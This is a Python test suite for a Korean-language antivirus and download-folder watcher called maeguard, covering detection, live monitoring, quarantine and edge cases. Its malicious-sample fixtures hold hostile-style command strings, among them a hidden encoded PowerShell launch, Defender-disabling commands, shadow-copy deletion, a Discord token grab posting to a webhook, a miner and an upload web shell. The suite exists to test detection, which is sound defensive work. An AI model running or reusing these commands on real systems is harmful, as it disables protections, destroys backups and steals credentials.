"""python tests/test_maeguard.py"""

import hashlib
import io
import os
import shutil
import sys
import tempfile
import threading
import time
import zipfile
from pathlib import Path

TMP = Path(tempfile.mkdtemp(prefix="maeguard_test_"))
os.environ["HOME"] = str(TMP / "home")
os.environ["USERPROFILE"] = str(TMP / "home")
(TMP / "home").mkdir()
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import maeguard as mg

EICAR = (b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-"
         b"ANTIVIRUS-TEST-FILE!$H+H*")
SIGS = mg.load_signatures()
RESULTS = []


def check(name, ok, detail=""):
    RESULTS.append((name, bool(ok), detail))
    print(("  PASS  " if ok else "  FAIL  ") + name + (f"  ({detail})" if detail and not ok else ""))


def zip_bytes(files: dict, encrypt_flag=False) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for n, d in files.items():
            z.writestr(n, d)
    data = bytearray(buf.getvalue())
    if encrypt_flag:
        i = 0
        while (i := data.find(b"PK\x03\x04", i)) >= 0:
            data[i + 6] |= 1; i += 4
        i = 0
        while (i := data.find(b"PK\x01\x02", i)) >= 0:
            data[i + 8] |= 1; i += 4
    return bytes(data)


MALICIOUS = {
    "eicar.com": EICAR,
    "eicar_as_photo.jpg": EICAR,
    "eicar_in.zip": zip_bytes({"eicar.com": EICAR}),
    "eicar_nested.zip": zip_bytes({"inner.zip": zip_bytes({"readme.txt": EICAR})}),
    "encoded_ps.bat": b"powershell -w hidden -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\r\n",
    "defender_off.ps1": b"Set-MpPreference -DisableRealtimeMonitoring $true\nAdd-MpPreference -ExclusionPath C:\\\n",
    "ransom.cmd": b"vssadmin delete shadows /all /quiet\r\nbcdedit /set {default} recoveryenabled no\r\n",
    "discord_grab.py": b'p=os.getenv("APPDATA")+"\\\\discord\\\\Local Storage\\\\leveldb"\n'
                       b'requests.post("https://discord.com/api/webhooks/1234567/abc")\n',
    "roblox.js": b"var c = document.cookie; // .ROBLOSECURITY steal\n",
    "inject.exe": b"MZ\x90\x00" + b"\x00" * 64 + b"VirtualAllocEx\x00WriteProcessMemory\x00CreateRemoteThread\x00",
    "invoice.pdf.exe": b"MZ\x90\x00",
    "free_robux_generator.exe": b"MZ\x90\x00",
    "photos.zip": zip_bytes({"IMG_2031.jpg.scr": b"MZ"}),
    "locked.zip": zip_bytes({"setup.exe": b"MZ"}, encrypt_flag=True),
    "report.docm": zip_bytes({"word/document.xml": b"<x/>",
                              "word/vbaProject.bin": b"Sub AutoOpen()\nShell \"cmd /c calc\"\nEnd Sub"}),
    "invoice.html": b'<script>var b=atob("TVo=");var bl=new Blob([b]);a.download="x.exe";</script>',
    "doc.pdf": b"%PDF-1.7\n1 0 obj<</OpenAction 2 0 R>>\n2 0 obj<</S/JavaScript/JS(app.alert(1))>>\n",
    "shortcut.lnk": b"L\x00\x00\x00" + "C:\\Windows\\System32\\cmd.exe /c powershell -w hidden".encode("utf-16le"),
    "miner.bat": b"xmrig.exe -o stratum+tcp://pool.example:3333\r\n",
    "upload.aspx": b'<%@ Page Language="C#" %>\n<% HttpPostedFile thisFile = Request.Files[0];'
                   b'thisFile.SaveAs(Path.Combine(x)); %>\n',
}

BENIGN = {
    "notes.txt": "오늘 할 일: 숙제, 게임".encode(),
    "cat.jpg": b"\xff\xd8\xff\xe0 normal jpeg",
    "normal.docx": zip_bytes({"word/document.xml": b"<w:document>hello</w:document>", "[Content_Types].xml": b"<x/>"}),
    "normal.pdf": b"%PDF-1.7\n1 0 obj<</Type/Catalog>>\n%%EOF",
    "page.html": b"<html><body><h1>My blog</h1><a href='https://example.com'>link</a></body></html>",
    "script.py": b"import os\nprint(sum(range(10)))\n",
    "setup_game.exe": b"MZ\x90\x00" + os.urandom(2048),
    "tools.zip": zip_bytes({"a.txt": b"hi", "b.txt": b"there"}),
    "backup.bat": b"@echo off\r\nxcopy C:\\Users\\me\\Documents D:\\backup /e /y\r\n",
}


def test_detection(engines):
    print("\n[1] 탐지 테스트 (위험 샘플은 잡고, 정상 파일은 통과해야 함)")
    d = TMP / "samples"
    d.mkdir()
    for n, data in {**MALICIOUS, **BENIGN}.items():
        (d / n).write_bytes(data)
    for n in MALICIOUS:
        r = mg.scan_file(d / n, SIGS, engines, vt_wait=0)
        check(f"탐지: {n}", r.verdict != "안전", f"점수 {r.score} {r.reasons}")
    for n in BENIGN:
        r = mg.scan_file(d / n, SIGS, engines, vt_wait=0)
        check(f"정상 통과: {n}", r.verdict == "안전", f"점수 {r.score} {r.reasons}")


def run_watcher(folder, actions, wait=4.0):
    seen = []
    stop = threading.Event()
    w = mg.Watcher(folder, lambda r: seen.append((r.path, r.verdict, r.path.stat().st_size if r.path.exists() else -1)),
                   interval=0.3)
    t = threading.Thread(target=w.run, args=(stop,), daemon=True)
    t.start()
    time.sleep(0.8)
    actions()
    time.sleep(wait)
    stop.set()
    t.join(3)
    return seen


def test_watch():
    print("\n[2] 실시간 감시 테스트")
    f = TMP / "home" / "Downloads"
    f.mkdir(parents=True, exist_ok=True)
    (f / "old.exe").write_bytes(b"MZ")

    seen = run_watcher(f, lambda: (f / "new.pdf.exe").write_bytes(b"MZ"))
    names = [p.name for p, *_ in seen]
    check("새 파일 감지", "new.pdf.exe" in names, names)
    check("기존 파일은 다시 검사 안 함", "old.exe" not in names, names)

    def browser_download():
        tmp = f / "game.zip.crdownload"
        tmp.write_bytes(zip_bytes({"cheat.pdf.exe": b"MZ"})[:10])
        time.sleep(0.7)
        tmp.write_bytes(zip_bytes({"cheat.pdf.exe": b"MZ"}))
        tmp.rename(f / "game.zip")
    seen = run_watcher(f, browser_download)
    names = [p.name for p, *_ in seen]
    check("다운로드 중 임시파일은 무시", not any(n.endswith(".crdownload") for n in names), names)
    check("다운로드 완료 후 검사", names.count("game.zip") == 1 and seen[0][1] != "안전", seen)

    final = b"MZ" + b"A" * 300_000

    def slow_download():
        with open(f / "slow.exe", "wb") as fh:
            for i in range(0, len(final), 30_000):
                fh.write(final[i:i + 30_000]); fh.flush(); time.sleep(0.15)
    seen = run_watcher(f, slow_download, wait=4)
    slow = [s for s in seen if s[0].name == "slow.exe"]
    check("천천히 받는 파일은 다 받은 뒤 1번만 검사", len(slow) == 1 and slow[0][2] == len(final), slow)

    def subfolder():
        sub = f / "extracted" / "bin"
        sub.mkdir(parents=True)
        (sub / "payload.pdf.exe").write_bytes(b"MZ")
    seen = run_watcher(f, subfolder)
    check("하위 폴더(압축 푼 폴더) 안 새 파일 감지", any(p.name == "payload.pdf.exe" for p, *_ in seen),
          [p.name for p, *_ in seen])

    def many():
        for i in range(50):
            (f / f"bulk_{i}.txt").write_bytes(b"hello %d" % i)
    seen = run_watcher(f, many, wait=5)
    check("한꺼번에 50개 생성 → 모두 검사", len({p.name for p, *_ in seen if p.name.startswith("bulk_")}) == 50,
          len(seen))

    victim = f / "bulk_0.txt"
    seen = run_watcher(f, lambda: victim.write_bytes(EICAR + b"   "))
    check("기존 파일 내용이 바뀌면 다시 검사", any(p.name == "bulk_0.txt" for p, *_ in seen), seen)


def test_quarantine():
    print("\n[3] 격리 / 복원 테스트")
    d = TMP / "q"
    d.mkdir()
    p = d / "한글 이름 테스트.pdf.exe"
    data = b"MZ" + os.urandom(5000) + EICAR
    p.write_bytes(data)
    r = mg.scan_file(p, SIGS)
    qid = mg.quarantine(r)
    qfile = mg.QUARANTINE_DIR / f"{qid}.qtn"
    check("격리 후 원본 삭제", not p.exists())
    check("격리 파일은 무해화 (원래 내용이 그대로 남지 않음)", EICAR not in qfile.read_bytes())
    restored = mg.restore_quarantine(qid)
    check("복원하면 원본과 똑같음", hashlib.sha256(restored.read_bytes()).digest() == hashlib.sha256(data).digest())
    qid2 = mg.quarantine(mg.scan_file(p, SIGS))
    p.write_bytes(b"new file with same name")
    restored2 = mg.restore_quarantine(qid2)
    check("같은 이름 파일이 있으면 덮어쓰지 않고 _복원됨 으로 복원", restored2.name.endswith("_복원됨.exe")
          and p.read_bytes() == b"new file with same name", restored2.name)
    qid3 = mg.quarantine(mg.scan_file(restored2, SIGS))
    mg.delete_quarantine(qid3)
    check("영구 삭제", qid3 not in mg.list_quarantine() and not (mg.QUARANTINE_DIR / f"{qid3}.qtn").exists())


def test_robustness():
    print("\n[4] 예외 상황")
    d = TMP / "edge"
    d.mkdir()
    (d / "empty.exe").write_bytes(b"")
    check("빈 파일 검사 시 오류 없음", mg.scan_file(d / "empty.exe", SIGS) is not None)
    (d / "broken.zip").write_bytes(b"PK\x03\x04garbage")
    check("깨진 zip 검사 시 오류 없음", mg.scan_file(d / "broken.zip", SIGS) is not None)
    big = d / "big.bin"
    with open(big, "wb") as fh:
        fh.seek(60 * 1024 * 1024); fh.write(b"\x00")
    t = time.time()
    mg.scan_file(big, SIGS)
    check("60MB 파일 검사 3초 이내", time.time() - t < 3, f"{time.time() - t:.1f}s")
    (d / "gone.exe").write_bytes(b"MZ")
    r = mg.scan_file(d / "gone.exe", SIGS)
    (d / "gone.exe").unlink()
    check("검사 직후 사라진 파일도 오류 없음", r is not None)


def main():
    engines = None
    try:
        import maeguard_engines as me
        engines = me.Engines({"use_defender": True, "use_virustotal": False, "use_yara": True})
        src = Path(os.environ.get("MAEGUARD_TEST_YARA", ""))
        if engines.yara and engines.yara.yara and src.is_file():
            me.YARA_DIR.mkdir(parents=True, exist_ok=True)
            shutil.copy(src, me.YARA_SOURCE)
            engines.yara.reload()
        print("외부 엔진:", ", ".join(engines.active_names()) or "없음")
    except Exception as e:
        print("외부 엔진 없이 테스트:", e)
    try:
        test_detection(engines)
        test_watch()
        test_quarantine()
        test_robustness()
    finally:
        shutil.rmtree(TMP, ignore_errors=True)
    fails = [r for r in RESULTS if not r[1]]
    print(f"\n결과: {len(RESULTS) - len(fails)}/{len(RESULTS)} 통과")
    for n, _, d in fails:
        print("  실패:", n, "-", d)
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
